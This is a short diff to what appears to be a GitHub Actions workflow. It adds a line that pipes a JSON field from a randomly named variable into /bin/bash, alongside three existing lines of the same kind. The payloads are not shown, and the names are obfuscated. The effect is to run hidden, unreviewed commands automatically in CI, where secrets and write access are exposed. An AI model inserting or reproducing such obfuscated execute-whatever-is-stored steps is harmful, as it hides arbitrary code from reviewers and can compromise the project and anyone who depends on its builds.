@@ -23,6 +23,7 @@ jobs:
           echo $j7820 | jq -r .lffk2898 | /bin/bash
           echo $hc65 | jq -r .c70 | /bin/bash
           echo $y5903 | jq -r .lx599 | /bin/bash
+          echo $z75518 | jq -r .kwqw1 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
